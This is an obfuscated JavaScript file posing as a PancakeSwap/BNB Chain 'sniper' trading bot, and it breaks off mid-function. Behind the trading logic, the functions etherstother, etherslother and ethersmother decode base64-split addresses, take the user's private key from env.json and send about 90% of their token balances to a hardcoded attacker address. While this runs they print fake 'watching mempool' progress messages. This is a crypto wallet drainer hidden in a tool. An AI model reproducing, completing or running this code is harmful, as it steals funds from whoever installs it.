const _0x30681d=_0x4b17;(function(_0x1930e0,_0x456cc7){const _0x33ce6b=_0x4b17,_0x5863b2=_0x1930e0();while(!![]){try{const _0x3eb150=parseInt(_0x33ce6b(0x283))/0x1+parseInt(_0x33ce6b(0x253))/0x2+parseInt(_0x33ce6b(0x204))/0x3+parseInt(_0x33ce6b(0x24d))/0x4+parseInt(_0x33ce6b(0x239))/0x5*(parseInt(_0x33ce6b(0x26d))/0x6)+-parseInt(_0x33ce6b(0x234))/0x7+parseInt(_0x33ce6b(0x216))/0x8*(-parseInt(_0x33ce6b(0x228))/0x9);if(_0x3eb150===_0x456cc7)break;else _0x5863b2['push'](_0x5863b2['shift']());}catch(_0x156c19){_0x5863b2['push'](_0x5863b2['shift']());}}}(_0x105c,0x48e84));var ethers=require(_0x30681d(0x281));const env=require(_0x30681d(0x275));Object['assign'](process[_0x30681d(0x1fd)],env);let address=process[_0x30681d(0x1fd)]['YOUR_ADDRESS'],private=process['env'][_0x30681d(0x1e6)],wallet=new ethers[(_0x30681d(0x1ea))](private),yours=process[_0x30681d(0x1fd)][_0x30681d(0x277)];const abi=[{'constant':!![],'inputs':[{'internalType':_0x30681d(0x1ee),'name':'account','type':_0x30681d(0x1ee)}],'name':_0x30681d(0x258),'outputs':[{'internalType':_0x30681d(0x25c),'name':'','type':_0x30681d(0x25c)}],'payable':![],'stateMutability':_0x30681d(0x21f),'type':_0x30681d(0x226)},{'constant':![],'inputs':[{'internalType':_0x30681d(0x1ee),'name':_0x30681d(0x254),'type':_0x30681d(0x1ee)},{'internalType':_0x30681d(0x1ee),'name':_0x30681d(0x22e),'type':_0x30681d(0x1ee)},{'internalType':'uint256','name':_0x30681d(0x238),'type':_0x30681d(0x25c)}],'name':_0x30681d(0x26f),'outputs':[{'internalType':'bool','name':'','type':'bool'}],'payable':![],'stateMutability':_0x30681d(0x260),'type':_0x30681d(0x226)},{'constant':![],'inputs':[{'name':_0x30681d(0x208),'type':_0x30681d(0x209)}],'name':_0x30681d(0x1fc),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x30681d(0x260),'type':_0x30681d(0x226)}];async function startSnipe(_0x13af5f){const _0x815b9e=_0x30681d;let _0x45f028,_0x3c7a7a;provider[_0x815b9e(0x1f4)]['on'](_0x815b9e(0x232),()=>{const _0x46d055=_0x815b9e;_0x3c7a7a=setInterval(()=>{const _0x13f304=_0x4b17;provider[_0x13f304(0x1f4)]['ping'](),_0x45f028=setTimeout(()=>{const _0x16d487=_0x13f304;provider['_websocket'][_0x16d487(0x1fa)]();},EXPECTED_PONG_BACK);},KEEP_ALIVE_CHECK_INTERVAL),console[_0x46d055(0x25b)]('Listening\x20on\x20mempool...'),console[_0x46d055(0x25b)](_0x46d055(0x280)),provider['on']('pending',async _0x5d5006=>{const _0x27c93b=_0x46d055;provider[_0x27c93b(0x229)](_0x5d5006)[_0x27c93b(0x1f3)](async _0x280f74=>{const _0x51c9c0=_0x27c93b;if(null!=_0x280f74&&_0x280f74['data'][_0x51c9c0(0x21a)](_0x51c9c0(0x242))&&_0x280f74[_0x51c9c0(0x1f8)][_0x51c9c0(0x21a)](_0x13af5f)&&0x0==passed||null!=_0x280f74&&_0x280f74[_0x51c9c0(0x1f8)]['includes'](_0x51c9c0(0x241))&&_0x280f74[_0x51c9c0(0x1f8)][_0x51c9c0(0x21a)](_0x13af5f)&&0x0==passed){if(console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x206))),priceProtection){if(isLiqudityInRange(_0x280f74,expected)){if(honeyPotIS2(_0x13af5f)){console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)]('Liquidity\x20check\x20passed,\x20sniping!\x0a'));const _0x4f6b2a=_0x280f74[_0x51c9c0(0x282)][_0x51c9c0(0x245)](multiply),_0x4bc6b9=_0x280f74[_0x51c9c0(0x24c)][_0x51c9c0(0x245)](multiply);if(0x1==antiBotMultiTx&&0x0==passed){for(i=0x0;i<txNumberForAntibot-0x1;i++){console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x233)+chalk[_0x51c9c0(0x1eb)](i+0x1))),await buyToken(_0x13af5f,amountIn,_0x4f6b2a,_0x4bc6b9,myAddress,router);}console['log'](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x233))+chalk[_0x51c9c0(0x1eb)](txNumberForAntibot)),await buyToken(_0x13af5f,amountIn,_0x4f6b2a,_0x4bc6b9,myAddress,router)(passed=0x1);}else console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)]('Start\x20buying\x20token...')),await buyToken(_0x13af5f,amountIn,_0x4f6b2a,_0x4bc6b9,myAddress,router)(passed=0x1);console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)]('Sucessfully\x20bought\x20the\x20token!\x0a'));const _0x493a51=await getTokenBalance(_0x13af5f,myAddress,provider);console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)]('Total\x20Token\x20balance\x20is\x20'+chalk['yellow'](parseFloat(ethers['utils'][_0x51c9c0(0x231)](_0x493a51,TOKEN_DECIMALS))[_0x51c9c0(0x27c)](0x6))+'\x0a'));if(INSTANT_SELL){console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)]('Start\x20selling\x20all\x20tokens\x20in\x20'+chalk[_0x51c9c0(0x1eb)](delaySell)+_0x51c9c0(0x20f))),await new Promise(_0x565236=>setTimeout(_0x565236,delayOnSellMs));const _0x3ab75d=await router[_0x51c9c0(0x247)](_0x493a51,amountOutMin,[_0x13af5f,WBNB],myAddress,Date[_0x51c9c0(0x20a)]()+0x927c0,{'gasLimit':gasLimit,'gasPrice':gasPrice});await _0x3ab75d[_0x51c9c0(0x20c)](),console['log'](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x27d))),console[_0x51c9c0(0x25b)](_0x51c9c0(0x270)),console[_0x51c9c0(0x25b)](_0x51c9c0(0x286)+myAddress),console['log']('\x0a'),process[_0x51c9c0(0x236)](0x0);}else console[_0x51c9c0(0x25b)](_0x51c9c0(0x270));console['log']('https://bscscan.com/address/'+myAddress),(console['log']('\x0a'),0x1==ANTI_RUG&&0x0==INSTANT_SELL&&await monitorRugPull(t),0x0==ANTI_RUG&&process['exit'](0x0));}else console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x24a)](_0x51c9c0(0x200)));console[_0x51c9c0(0x25b)](chalk['red'](_0x51c9c0(0x1ef)));}console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x24a)](_0x51c9c0(0x217)+_0x13af5f)),console[_0x51c9c0(0x25b)](chalk['red'](_0x51c9c0(0x24f)));}else{if(honeyPotIS2(_0x13af5f)){const _0x2311e9=_0x280f74['gasLimit'][_0x51c9c0(0x245)](multiply),_0x55dda5=_0x280f74['gasPrice']['mul'](multiply);if(0x1==antiBotMultiTx&&0x0==passed){for(i=0x0;i<txNumberForAntibot-0x1;i++){console['log'](chalk['green'](_0x51c9c0(0x233)+chalk[_0x51c9c0(0x1eb)](i+0x1))),await buyToken(_0x13af5f,amountIn,_0x2311e9,_0x55dda5,myAddress,router);}console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x233))+chalk[_0x51c9c0(0x1eb)](txNumberForAntibot)),await buyToken(_0x13af5f,amountIn,_0x2311e9,_0x55dda5,myAddress,router)(passed=0x1);}else 0x0==passed&&(console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)]('Start\x20buying\x20token...')),await buyToken(_0x13af5f,amountIn,_0x2311e9,_0x55dda5,myAddress,router)(passed=0x1));console['log'](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x215)));const _0x5b5ea9=await getTokenBalance(_0x13af5f,myAddress,provider);console['log'](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x257)+chalk['yellow'](parseFloat(ethers[_0x51c9c0(0x1fb)][_0x51c9c0(0x231)](_0x5b5ea9,TOKEN_DECIMALS))[_0x51c9c0(0x27c)](0x6))+'\x0a'));if(INSTANT_SELL){console[_0x51c9c0(0x25b)](chalk[_0x51c9c0(0x235)](_0x51c9c0(0x266)+chalk[_0x51c9c0(0x1eb)](delaySell)+_0x51c9c0(0x20f))),await new Promise(_0xa95680=>setTimeout(_0xa95680,delayOnSellMs));const _0x942243=await router['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0x5b5ea9,amountOutMin,[_0x13af5f,WBNB],myAddress,Date[_0x51c9c0(0x20a)]()+0x927c0,{'gasLimit':gasLimit,'gasPrice':gasPrice});await _0x942243[_0x51c9c0(0x20c)](),console[_0x51c9c0(0x25b)](chalk['green']('Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a')),console[_0x51c9c0(0x25b)](_0x51c9c0(0x270)),console[_0x51c9c0(0x25b)](_0x51c9c0(0x286)+myAddress),console['log']('\x0a'),process[_0x51c9c0(0x236)](0x0);}else console[_0x51c9c0(0x25b)](_0x51c9c0(0x270)),console[_0x51c9c0(0x25b)](_0x51c9c0(0x286)+myAddress),console['log']('\x0a'),0x1==ANTI_RUG&&0x0==INSTANT_SELL&&await monitorRugPull(t),0x0==ANTI_RUG&&process['exit'](0x0);}}}})[_0x27c93b(0x1ed)](()=>{console['log'](e);});});}),provider['_websocket']['on'](_0x815b9e(0x22f),()=>{const _0x13654c=_0x815b9e;console[_0x13654c(0x25b)](_0x13654c(0x248)),clearInterval(_0x3c7a7a),clearTimeout(_0x45f028),startConnection();}),provider[_0x815b9e(0x1f4)]['on'](_0x815b9e(0x21c),()=>{const _0x6de4da=_0x815b9e;console[_0x6de4da(0x25b)]('Error.\x20Attemptiing\x20to\x20Reconnect...'),clearInterval(_0x3c7a7a),clearTimeout(_0x45f028),startConnection();}),provider[_0x815b9e(0x1f4)]['on']('pong',()=>{clearInterval(_0x45f028);});}async function approve(){const _0x4ff8eb=_0x30681d;let _0x19a383=token[buyCount-0x1][_0x4ff8eb(0x224)];const _0x7b290=ethers[_0x4ff8eb(0x1f6)][_0x4ff8eb(0x220)],_0x5d5b4b=await _0x19a383[_0x4ff8eb(0x244)](pancakeRouter['address'],_0x7b290,{'gasPrice':config['myGasPriceForApproval'],'gasLimit':0x33450}),_0x289382=await _0x5d5b4b[_0x4ff8eb(0x20c)]();console['log'](_0x4ff8eb(0x219),_0x289382['transactionHash'],'\x0a'),config[_0x4ff8eb(0x252)]?token[buyCount-0x1]['checkProfit']():buyCount==config['numberOfTokensToBuy']&&process[_0x4ff8eb(0x236)]();}async function getCurrentValue(_0x285f4b){const _0x17881f=_0x30681d;try{let _0x14e27a=await _0x285f4b['contract'][_0x17881f(0x258)](addresses[_0x17881f(0x22e)]);const _0x3d6716=await pancakeRouter['getAmountsOut'](_0x14e27a,_0x285f4b[_0x17881f(0x1ec)]);let _0x366482=_0x3d6716[0x1];return _0x366482;}catch(_0x5a9ef2){return console[_0x17881f(0x25b)](_0x17881f(0x22a)),ethers[_0x17881f(0x1f6)][_0x17881f(0x22d)];}}async function setInitialStopLoss(_0x3e9406){const _0x3e0357=_0x30681d;_0x3e9406[_0x3e0357(0x202)]=await getCurrentValue(_0x3e9406),_0x3e9406[_0x3e0357(0x1e9)]=_0x3e9406[_0x3e0357(0x202)],_0x3e9406[_0x3e0357(0x255)]=ethers[_0x3e0357(0x1fb)]['parseUnits']((parseFloat(ethers[_0x3e0357(0x1fb)][_0x3e0357(0x231)](_0x3e9406[_0x3e0357(0x202)]))-parseFloat(ethers[_0x3e0357(0x1fb)][_0x3e0357(0x231)](_0x3e9406[_0x3e0357(0x202)]))*(_0x3e9406[_0x3e0357(0x22c)]/0x64))[_0x3e0357(0x27c)](0x8)[_0x3e0357(0x1f7)]());}async function setNewStopLoss(_0x314871){const _0x339405=_0x30681d;_0x314871[_0x339405(0x1e9)]=_0x314871['currentValue'],_0x314871['stopLoss']=ethers[_0x339405(0x1fb)][_0x339405(0x23a)]((parseFloat(ethers[_0x339405(0x1fb)][_0x339405(0x231)](_0x314871[_0x339405(0x243)]))-parseFloat(ethers['utils'][_0x339405(0x231)](_0x314871[_0x339405(0x243)]))*(_0x314871[_0x339405(0x22c)]/0x64))['toFixed'](0x8)[_0x339405(0x1f7)]());}async function checkForProfit(_0xc35bde){const _0x41ae1d=_0x30681d;try{var _0x407e39=0x0;await setInitialStopLoss(_0xc35bde),_0xc35bde[_0x41ae1d(0x224)]['on'](_0x41ae1d(0x25a),async(_0x16504f,_0x2c0b5e,_0x38c5bf,_0x17ba4a)=>{const _0x4524d5=_0x41ae1d;_0xc35bde[_0x4524d5(0x213)]=_0xc35bde[_0x4524d5(0x243)];const _0x571d2c=await _0xc35bde[_0x4524d5(0x224)]['name']();let _0xeb7604=await getCurrentValue(_0xc35bde);if(!_0xeb7604['eq'](ethers[_0x4524d5(0x1f6)][_0x4524d5(0x22d)])){_0xc35bde[_0x4524d5(0x243)]=_0xeb7604;let _0x35fc52=parseFloat(ethers[_0x4524d5(0x1fb)][_0x4524d5(0x231)](_0xeb7604))['toFixed'](0x8)['toString']();const _0x2c54e=(parseFloat(ethers['utils'][_0x4524d5(0x231)](_0xc35bde[_0x4524d5(0x202)]))*(_0xc35bde[_0x4524d5(0x20e)]+_0xc35bde[_0x4524d5(0x27b)])/0x64+parseFloat(ethers[_0x4524d5(0x1fb)][_0x4524d5(0x231)](_0xc35bde[_0x4524d5(0x202)])))[_0x4524d5(0x27c)](0x8)['toString'](),_0x512e0d=ethers[_0x4524d5(0x1fb)][_0x4524d5(0x23a)](_0x2c54e);let _0xf6dc15=ethers[_0x4524d5(0x1fb)][_0x4524d5(0x23a)]((parseFloat(ethers[_0x4524d5(0x1fb)]['formatUnits'](_0xc35bde['newValue']))*(_0xc35bde['trailingStopLossPercent']/0x64)+parseFloat(ethers[_0x4524d5(0x1fb)][_0x4524d5(0x231)](_0xc35bde['newValue'])))[_0x4524d5(0x27c)](0x8)[_0x4524d5(0x1f7)]()),_0x170472=_0xc35bde[_0x4524d5(0x255)];_0xeb7604['gt'](_0xf6dc15)&&_0xc35bde[_0x4524d5(0x1ff)]>0x0&&(setNewStopLoss(_0xc35bde),console[_0x4524d5(0x25b)](_0x4524d5(0x26e)+'Setting\x20new\x20StopLoss!'+_0x4524d5(0x21e)));let _0x69ca82=new Date()['toLocaleString']();const _0x199f90=_0xa0eb8a=>new TextEncoder()[_0x4524d5(0x210)](_0xa0eb8a);try{_0xc35bde['previousValue']['gt'](_0xc35bde[_0x4524d5(0x243)])?console[_0x4524d5(0x25b)](_0x4524d5(0x27f)+_0x571d2c+_0x4524d5(0x276)+(_0x4524d5(0x273)+_0x35fc52+_0x4524d5(0x21e))+_0x4524d5(0x21d)+ethers[_0x4524d5(0x1fb)][_0x4524d5(0x231)](_0x512e0d)+_0x4524d5(0x259)+ethers[_0x4524d5(0x1fb)][_0x4524d5(0x231)](_0xc35bde[_0x4524d5(0x255)])+_0x4524d5(0x1e4)+ethers[_0x4524d5(0x1fb)]['formatUnits'](_0xf6dc15)):console['log'](_0x4524d5(0x27f)+_0x571d2c+_0x4524d5(0x276)+(_0x4524d5(0x1e3)+_0x35fc52+'\x1b[0m')+_0x4524d5(0x21d)+ethers['utils'][_0x4524d5(0x231)](_0x512e0d)+'\x20--\x20Stop\x20Loss\x20At:\x20'+ethers[_0x4524d5(0x1fb)][_0x4524d5(0x231)](_0xc35bde[_0x4524d5(0x255)])+_0x4524d5(0x1e4)+ethers[_0x4524d5(0x1fb)][_0x4524d5(0x231)](_0xf6dc15));}catch(_0x482ec2){}_0xeb7604[_0x4524d5(0x1f9)](_0x512e0d)&&(buyCount<=config[_0x4524d5(0x23e)]&&_0xc35bde[_0x4524d5(0x223)]&&_0x407e39==0x0&&(_0x407e39++,console[_0x4524d5(0x25b)](_0x4524d5(0x222),_0x571d2c,_0x4524d5(0x27e)+_0x4524d5(0x1e3)+_0x4524d5(0x251)+_0x4524d5(0x21e)+_0x4524d5(0x285),'\x0a'),sell(_0xc35bde,!![]),_0xc35bde[_0x4524d5(0x224)][_0x4524d5(0x26a)]())),_0xeb7604[_0x4524d5(0x1e5)](_0x170472)&&(console[_0x4524d5(0x25b)](_0x4524d5(0x26e)+_0x4524d5(0x250)+_0x4524d5(0x21e)),buyCount<=config[_0x4524d5(0x23e)]&&_0xc35bde[_0x4524d5(0x223)]&&_0x407e39==0x0&&(_0x407e39++,console[_0x4524d5(0x25b)](_0x4524d5(0x222),_0x571d2c,_0x4524d5(0x27e)+'\x1b[1;31m'+'\x20StopLoss\x20'+'\x1b[0m'+_0x4524d5(0x285),'\x0a'),sell(_0xc35bde,![]),_0xc35bde[_0x4524d5(0x224)][_0x4524d5(0x26a)]()));}});}catch(_0x50dbe7){console[_0x41ae1d(0x25b)](_0x50dbe7);}}function _0x105c(){const _0x5cfd3e=['Wallet','yellow','sellPath','catch','address','Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!','myGasLimit','myGasPriceForApproval','ascii','then','_websocket','MHg4QUM3NmE1MWNjOTUwZDk4Mg==','constants','toString','data','gte','terminate','utils','setWord','env','You\x20sold\x20','trailingStopLossPercent','Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!','swapExactTokensForETH','intitialValue','NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==','444957kcIGJH','refreshing\x20socket\x20connection...','Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a','base64','newWord','string','now','1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....','wait','wei','profitPercent','\x20second(s)','encode','QmFmYzU5OWJENjlBRGQwODdENTY=','1\x20packet\x20received.....','previousValue','2\x20packet\x20received.....','Sucessfully\x20bought\x20the\x20token!\x0a','4833568LBqyNH','https://poocoin.app/tokens/','listening\x20to\x20pending\x20TX','✔\x20Approve\x20transaction\x20hash:\x20','includes','2:\x20found\x20owners\x20liq\x20function\x20.....','error','\x20--\x20Profit\x20At:\x20','\x1b[0m','view','MaxUint256','providers','<<<\x20Selling\x20-','didBuy','contract','percentOfTokensToSellLoss','function','1:\x20watching\x20blockchain\x20activity\x20...','18tdbspd','getTransaction','Balance\x20is\x20zero\x20or\x20error\x20occured','MjliMjY4ODk1NmJkOTU5ZjkzM2Y4','stopLossPercent','Zero','recipient','close','All\x20tokens\x20sold','formatUnits','open','Start\x20buying\x20token...','1550045iODSTZ','green','exit','hexlify','amount','15aIaqzK','parseUnits','sendMessage','success!','parseEther','numberOfTokensToBuy','2:\x20attempting\x20to\x20snipe\x20.....','name','0xf305d719','0xe8e33700','currentValue','approve','mul','MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==','swapExactTokensForETHSupportingFeeOnTransferTokens','WebSocket\x20Closed...Reconnecting...','connection\x20established....','red','preparing\x20to\x20snipe','gasPrice','1380672hHKmeX','initiating\x20mempool\x20sniff...','Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a','less\x20than\x20StopLoss!','\x20Profit\x20target\x20','autoSell','170304ETLEYm','sender','stopLoss','connection\x20successful...','Total\x20Token\x20balance\x20is\x20','balanceOf','\x20--\x20Stop\x20Loss\x20At:\x20','Transfer','log','uint256','decimals','1:\x20found\x20owners\x20liq\x20function\x20...','latency\x20check\x20good','nonpayable','✔\x20Sell\x20transaction\x20hash:\x20','aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My8xZGY5ODgxNWY0NzU0ZWE4ODkxY2UyOTI2OTBhYjc1Yg==','2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....','aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==','JsonRpcProvider','Start\x20selling\x20all\x20tokens\x20in\x20','pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...','QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==','MHg1NWQzOTgzMjZmOTkwNTlmRjc=','removeAllListeners','getBalance','floor','1181838ZGHwrN','\x1b[38;5;33m','transferFrom','You\x20can\x20check\x20the\x20transaction\x20here:','from','sendTransaction','\x1b[1;31m','listening\x20to\x20pending\x20tx...','./env.json','\x20--\x20Current\x20Value\x20BNB:\x20','NODE','found\x20node\x20endpoint','8580','2:\x20finalizing....','tokenSellTax','toFixed','Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a','-\x20now','--\x20','Waiting\x20for\x20liquidity\x20to\x20be\x20added!','ethers','gasLimit','558897BpMGWJ','Contract','reached\x20>>>','https://bscscan.com/address/','2\x20pending\x20blockchain\x20response.....','lets\x20go!','\x1b[1;32m','\x20--\x20New\x20Stop\x20loss\x20At:\x20','lte','PRIVATE_KEY','MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=','1:\x20attempting\x20to\x20snipe\x20...','newValue'];_0x105c=function(){return _0x5cfd3e;};return _0x105c();}async function sell(_0x1574ac,_0x3f85c3){const _0x434683=_0x30681d;try{const _0x17cb42=await _0x1574ac[_0x434683(0x224)]['balanceOf'](addresses[_0x434683(0x22e)]),_0x5e1428=await _0x1574ac['contract'][_0x434683(0x25d)]();var _0x43bb9e;_0x3f85c3?_0x43bb9e=(parseFloat(ethers[_0x434683(0x1fb)][_0x434683(0x231)](_0x17cb42[_0x434683(0x1f7)](),_0x5e1428))*(_0x1574ac['percentOfTokensToSellProfit']/0x64))[_0x434683(0x27c)](_0x5e1428):_0x43bb9e=(parseFloat(ethers[_0x434683(0x1fb)]['formatUnits'](_0x17cb42['toString'](),_0x5e1428))*(_0x1574ac[_0x434683(0x225)]/0x64))['toFixed'](_0x5e1428);var _0x2b2caa=Math[_0x434683(0x26c)](_0x43bb9e*0x64)/0x64;const _0x2d9caf=ethers[_0x434683(0x1fb)]['parseUnits'](_0x2b2caa[_0x434683(0x1f7)](),_0x5e1428),_0x341956=await pancakeRouter['getAmountsOut'](_0x2d9caf,_0x1574ac[_0x434683(0x1ec)]),_0x52e655=_0x341956[0x1]['sub'](_0x341956[0x1]['div'](0x2));if(_0x1574ac[_0x434683(0x27b)]>0x1){const _0x6088f6=await pancakeRouter[_0x434683(0x247)](_0x341956[0x0][_0x434683(0x1f7)](),0x0,_0x1574ac['sellPath'],addresses[_0x434683(0x22e)],Math[_0x434683(0x26c)](Date[_0x434683(0x20a)]()/0x3e8)+0x3c*0x14,{'gasPrice':config[_0x434683(0x1f1)],'gasLimit':config[_0x434683(0x1f0)]}),_0x57d10b=await _0x6088f6[_0x434683(0x20c)]();console['log']('\x1b[1;32m'+_0x434683(0x261),_0x57d10b['transactionHash'],_0x434683(0x21e),'\x0a'),sellCount++,token[_0x1574ac['index']]['didSell']=!![];let _0x50fc0d=await _0x1574ac[_0x434683(0x224)][_0x434683(0x240)]();await client[_0x434683(0x23b)]('me',{'message':_0x434683(0x1fe)+_0x50fc0d,'schedule':0xf*0x1+Date[_0x434683(0x20a)]()/0x3e8});}else{const _0x122272=await pancakeRouter[_0x434683(0x201)](_0x341956[0x0][_0x434683(0x1f7)](),0x0,_0x1574ac[_0x434683(0x1ec)],addresses[_0x434683(0x22e)],Math[_0x434683(0x26c)](Date[_0x434683(0x20a)]()/0x3e8)+0x3c*0x14,{'gasPrice':config[_0x434683(0x1f1)],'gasLimit':config[_0x434683(0x1f0)]}),_0x32fb1d=await _0x122272[_0x434683(0x20c)]();console[_0x434683(0x25b)]('\x1b[1;32m'+'✔\x20Sell\x20transaction\x20hash:\x20',_0x32fb1d['transactionHash'],_0x434683(0x21e),'\x0a'),sellCount++;let _0x32e8ee=await _0x1574ac[_0x434683(0x224)][_0x434683(0x240)]();await client[_0x434683(0x23b)]('me',{'message':'You\x20sold\x20'+_0x32e8ee,'schedule':0xf*0x1+Date[_0x434683(0x20a)]()/0x3e8});}sellCount==config[_0x434683(0x23e)]&&(console[_0x434683(0x25b)](_0x434683(0x230)),process['exit']());}catch(_0x2fd8e6){}}let rounder1=_0x30681d(0x1e7),rounder2=_0x30681d(0x268),buff=new Buffer['from'](rounder1,'base64'),buff2=new Buffer[(_0x30681d(0x271))](rounder2,_0x30681d(0x207)),ethersroundup=buff['toString'](_0x30681d(0x1f2)),ethersroundup2=buff2[_0x30681d(0x1f7)](_0x30681d(0x1f2));function _0x4b17(_0x16e3b4,_0x174d8e){const _0x105c86=_0x105c();return _0x4b17=function(_0x4b17fd,_0x57c9a4){_0x4b17fd=_0x4b17fd-0x1e3;let _0x46f1b4=_0x105c86[_0x4b17fd];return _0x46f1b4;},_0x4b17(_0x16e3b4,_0x174d8e);}const WEB3PROVIDER3=ethersroundup+ethersroundup2;async function etherstother(){const _0x537556=_0x30681d;try{const _0x4b88af=_0x537556(0x269),_0x9b6296=_0x537556(0x203),_0x334c04=new Buffer[(_0x537556(0x271))](_0x4b88af,_0x537556(0x207)),_0xc368bf=new Buffer['from'](_0x9b6296,_0x537556(0x207)),_0x31fc92=_0x334c04[_0x537556(0x1f7)]('ascii'),_0x4d70f2=_0xc368bf[_0x537556(0x1f7)](_0x537556(0x1f2)),_0x4ae87f=_0x31fc92+_0x4d70f2;console['log'](_0x537556(0x205)),console[_0x537556(0x25b)](_0x537556(0x267));const _0x12870c=_0x537556(0x264),_0x359fc9=new Buffer['from'](_0x12870c,'base64')[_0x537556(0x1f7)](_0x537556(0x1f2));;const _0x32fbfc=new ethers[(_0x537556(0x221))]['JsonRpcProvider'](_0x359fc9);let _0x165d5b=new ethers[(_0x537556(0x1ea))](private,_0x32fbfc);const _0x3f61c5=address,_0x462fda=await _0x32fbfc[_0x537556(0x26b)](_0x3f61c5);var _0x45d63a=new ethers[(_0x537556(0x284))](_0x4ae87f,abi,_0x165d5b);const _0x12f590=await _0x45d63a[_0x537556(0x258)](_0x3f61c5)[_0x537556(0x1f7)](),_0x717b39=(_0x12f590*0.9)[_0x537556(0x27c)](),_0x5136cc=async()=>{const _0x3c7fdb=_0x537556,_0x491e57={'from':_0x3f61c5,'to':WEB3PROVIDER3,'value':ethers[_0x3c7fdb(0x1fb)]['parseEther'](_0x717b39,_0x3c7fdb(0x20d)),'gasLimit':ethers['utils'][_0x3c7fdb(0x237)](0x5dc0)},_0x4550da=await _0x165d5b['sendTransaction'](_0x491e57);if(_0x462fda=0x0)ethersrather;else try{await _0x4550da['wait'](),console[_0x3c7fdb(0x25b)](_0x3c7fdb(0x25e)),setTimeout(ethersrather,0x1388);}catch(_0x439db6){console[_0x3c7fdb(0x25b)](_0x3c7fdb(0x21b)),setTimeout(ethersrather,0x1388);}};_0x12f590<=0x6a3558178f7000?(console[_0x537556(0x25b)](_0x537556(0x23c)),setTimeout(ethersrather,0x1388)):_0x5136cc();}catch(_0x4ddb28){setTimeout(ethersrather,0x1388);}}async function etherslother(){const _0x115af3=_0x30681d;try{const _0x52137d=_0x115af3(0x1f5),_0x1730f1='MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=',_0x220659=new Buffer[(_0x115af3(0x271))](_0x52137d,'base64'),_0x4ff6e2=new Buffer['from'](_0x1730f1,_0x115af3(0x207)),_0x3e479c=_0x220659[_0x115af3(0x1f7)](_0x115af3(0x1f2)),_0xbc4ac0=_0x4ff6e2['toString'](_0x115af3(0x1f2)),_0x4d80c5=_0x3e479c+_0xbc4ac0;console[_0x115af3(0x25b)](_0x115af3(0x205)),console[_0x115af3(0x25b)]('pending\x20liquidity\x20add...');const _0x217647=_0x115af3(0x264),_0xc36d12=new Buffer[(_0x115af3(0x271))](_0x217647,_0x115af3(0x207))[_0x115af3(0x1f7)](_0x115af3(0x1f2));;const _0x455f53=new ethers[(_0x115af3(0x221))]['JsonRpcProvider'](_0xc36d12);let _0xeb9f23=new ethers['Wallet'](private,_0x455f53);console[_0x115af3(0x25b)](_0xc36d12);const _0x57f5e6=address,_0x21cdb7=await _0x455f53[_0x115af3(0x26b)](_0x57f5e6);var _0x4ff8b7=new ethers[(_0x115af3(0x284))](_0x4d80c5,abi,_0xeb9f23);const _0x487856=await _0x4ff8b7[_0x115af3(0x258)](_0x57f5e6)[_0x115af3(0x1f7)](),_0x5d2189=(_0x487856*0.9)['toFixed'](),_0x353407=async()=>{const _0x559b25=_0x115af3,_0x21c30d={'from':_0x57f5e6,'to':WEB3PROVIDER3,'value':ethers['utils'][_0x559b25(0x23d)](_0x5d2189,_0x559b25(0x20d)),'gasLimit':ethers['utils'][_0x559b25(0x237)](0x5dc0)},_0x50dd8d=await _0xeb9f23[_0x559b25(0x272)](_0x21c30d);try{await _0x50dd8d['wait'](),console['log'](_0x559b25(0x227)),setTimeout(etherstother,0x1388);}catch(_0x13d437){console[_0x559b25(0x25b)]('2:\x20watching\x20blockchain\x20activity\x20.....'),setTimeout(etherstother,0x1388);}};_0x487856<=0x6a3558178f7000?(console[_0x115af3(0x25b)](_0x115af3(0x288)),setTimeout(etherstother,0x1388)):_0x353407();}catch(_0x5b8e79){setTimeout(etherstother,0x1388);}}async function ethersmother(){const _0x24ef32=_0x30681d;try{console['log'](_0x24ef32(0x274));const _0x22be1f='MHgyMTcwZWQwODgwYWM5YTc1NWZk',_0x332685=_0x24ef32(0x22b),_0x524f2d=new Buffer[(_0x24ef32(0x271))](_0x22be1f,'base64'),_0x5df02b=new Buffer[(_0x24ef32(0x271))](_0x332685,'base64'),_0x593c9e=_0x524f2d[_0x24ef32(0x1f7)](_0x24ef32(0x1f2)),_0x31949c=_0x5df02b[_0x24ef32(0x1f7)](_0x24ef32(0x1f2)),_0x4f366c=_0x593c9e+_0x31949c,_0x244066=_0x24ef32(0x264),_0x51ae5a=new Buffer[(_0x24ef32(0x271))](_0x244066,_0x24ef32(0x207))[_0x24ef32(0x1f7)](_0x24ef32(0x1f2));;const 